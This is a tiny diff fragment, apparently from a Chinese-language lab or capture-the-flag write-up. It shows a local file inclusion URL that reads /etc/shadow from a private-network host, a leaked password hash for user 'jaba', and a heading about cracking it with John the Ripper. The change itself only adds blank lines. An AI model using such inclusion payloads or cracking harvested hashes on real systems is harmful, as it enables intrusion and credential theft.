@@ -33,3 +33,5 @@ http://192.168.44.147/building/index.php?page=/etc/shadow
 jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7::: 
 ```
 # john爆破
+
+
